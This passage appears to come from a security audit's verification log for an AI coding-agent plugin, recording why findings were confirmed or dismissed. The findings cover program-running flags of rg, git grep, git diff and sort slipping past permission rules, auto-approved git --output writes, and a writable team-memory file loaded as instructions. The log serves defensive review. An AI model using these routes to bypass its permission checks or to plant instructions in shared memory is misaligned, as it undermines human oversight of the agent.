verifications.reason: The code path holds (sort on HUNT_PROGRAMS, no rule beyond -o/--output) unlike rg --pre, git grep -O and --ext-diff; the run-time behaviour of GNU sort (buffer limits, MSYS build) could not be seen.

verifications.title: The repository's own .claude/settings.json is the 2.0.1 scaffold: no deny list, bare Read allowed, git blame still pre-approved, git log/diff/show --output writes auto-approved next to auto-approved test runners
verifications.reason: The file is one developer's untracked local configuration (.gitignore:3, git ls-files empty, never in history); the shipped template already omits git blame and carries the denies (settings.json.tmpl:9-15, 64-96; CHANGES.json:29).

verifications.title: The team-memory index is auto-loaded as instructions in every session, but an autopilot stage may write it freely and no check looks at its content
verifications.reason: Recorded decision (12e150f reversed aa424a8; RELEASE-NOTES v2.1.0 line 238; fixtures pin the writes); the engine never merges and pushes only <ID>- branches, so a planted line reaches other sessions only through a human-reviewed PR; later stages stay inside the same envelope.

verifications.title: The scaffolded Chrome DevTools MCP server runs with Google usage statistics and CrUX URL upload enabled
verifications.reason: A privacy default of a third-party server with no attacker-reachable path: the recipient is the vendor, no shipped skill drives the DevTools server (qa-lane-1-ui SKILL.md:10 names Playwright as the only browser), and Rule 5 (AGENTS.md:47) binds the plugin's own code.
